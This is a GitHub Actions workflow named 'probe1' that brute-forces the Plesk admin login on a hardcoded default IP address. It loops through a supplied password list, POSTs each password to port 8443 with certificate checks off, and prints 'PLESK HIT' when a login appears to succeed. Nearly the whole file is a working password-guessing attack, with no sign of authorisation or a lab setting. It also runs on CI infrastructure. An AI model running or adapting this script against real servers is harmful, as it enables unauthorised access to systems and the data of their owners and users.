name: probe1
on:
  workflow_dispatch:
    inputs:
      target:
        description: 'target ip'
        default: '74.208.88.23'
      pws:
        description: 'JSON array of passwords'
        default: '["admin","admin123"]'
jobs:
  plesk:
    runs-on: ubuntu-latest
    steps:
      - name: plesk loop
        run: |
          set +e
          T="${{ inputs.target }}"
          echo '${{ inputs.pws }}' | python3 -c "import sys,json;print('\n'.join(json.load(sys.stdin)))" > /tmp/pws.txt
          while read -r pw; do
            [ -z "$pw" ] && continue
            code=$(curl -sk -m 20 -o /tmp/body -w '%{http_code}' -X POST "https://$T:8443/login_up.php3" --data-urlencode "login_name=admin" --data-urlencode "passwd=$pw" --data-urlencode "submit_login=" 2>/dev/null)
            inc=$(grep -ci 'incorrect' /tmp/body 2>/dev/null)
            sz=$(wc -c < /tmp/body 2>/dev/null)
            if [ "$code" = "200" ] && [ "$inc" = "0" ] && [ "$sz" -gt 1000 ]; then
              echo "*** PLESK HIT admin:$pw (http=$code size=$sz)"
            else
              echo "    miss admin:$pw (http=$code incorrect=$inc size=$sz)"
            fi
          done < /tmp/pws.txt
